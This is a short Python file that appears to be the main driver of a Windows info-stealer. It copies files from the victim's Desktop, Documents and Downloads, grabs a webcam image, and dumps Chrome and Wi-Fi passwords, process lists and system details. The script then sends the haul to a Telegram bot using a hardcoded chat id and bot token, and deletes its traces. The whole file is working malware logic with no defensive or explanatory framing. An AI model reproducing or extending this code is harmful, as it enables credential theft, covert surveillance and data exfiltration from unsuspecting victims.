import time
import getpass
import processes
import infoabpc
import passwordsChrome
import telgBot
import texts
import createfolders
import makeitclean
import passwordsWifi
import os
import webcam

Chat_id = '1251098499'
Token = '6441831718:AAFOcfKAWNpQoZPftb01SbEr3mEvZsMfEJ0'

createfolders.create_all()

current_user = getpass.getuser()
path2 = os.path.join("C:\\Users", current_user, "Desktop")
path1 = os.path.join("C:\\Users", current_user, "Documents")
path3 = os.path.join("C:\\Users", current_user, "Downloads")
destin1 = os.path.join(r'C:\Min\texts', 'documents')
destin2 = os.path.join(r'C:\Min\texts', 'desktop')
destin3 = os.path.join(r'C:\Min\texts', 'downloads')

texts.proverka(path1, destin1)
time.sleep(0.1)
texts.proverka(path2, destin2)
time.sleep(0.1)
texts.proverka(path3, destin3)

webcam.get_webcam()

passwordsChrome.main()

passwordsWifi.get_all_passwords()

processes.all_processes()

infoabpc.gather_system()

telgBot.send(Chat_id, Token)
time.sleep(0.1)

makeitclean.delete_all()